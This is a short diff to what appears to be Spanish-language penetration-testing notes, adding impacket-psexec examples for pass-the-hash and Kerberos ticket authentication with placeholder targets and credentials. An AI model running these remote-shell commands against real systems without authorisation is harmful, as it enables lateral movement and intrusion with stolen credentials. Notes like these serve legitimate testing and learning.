@@ -19,3 +19,11 @@ impacket-psexec Administrador:Password123@IP_OBJETIVO
 ```
 impacket-psexec dominio.local/admin_user:Password123@IP_OBJETIVO
 ```
+
+```
+impacket-psexec -hashes :HASH_NT dominio/usuario@IP_OBJETIVO
+```
+
+```
+impacket-psexec -k -no-pass dominio/usuario@IP_OBJETIVO
+```
